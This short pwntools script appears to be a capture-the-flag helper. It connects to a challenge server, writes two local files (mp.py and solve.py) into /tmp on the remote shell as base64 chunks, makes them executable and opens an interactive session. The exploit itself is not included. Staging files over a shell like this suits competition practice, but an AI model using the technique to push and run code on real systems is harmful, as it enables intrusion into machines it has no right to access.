import base64
from pwn import *

context.log_level = 'DEBUG'
r = remote('drstrange.sstf.site', 31339)

with open('mp.py', 'rb') as f:
    while True:
        data = f.read(0x400)
        if not data:
            break

        r.recvuntil(b'/$ ')
        r.sendline(b'echo -n ' + base64.b64encode(data) + b' | base64 -d >> /tmp/mp.py')

print('===')

with open('solve.py', 'rb') as f:
    while True:
        data = f.read(0x400)
        if not data:
            break

        r.recvuntil(b'/$ ')
        r.sendline(b'echo -n ' + base64.b64encode(data) + b' | base64 -d >> /tmp/solve.py')

r.sendlineafter(b'/$ ', b'cd /tmp')
r.sendlineafter(b'/tmp$ ', b'chmod +x *')
r.interactive()
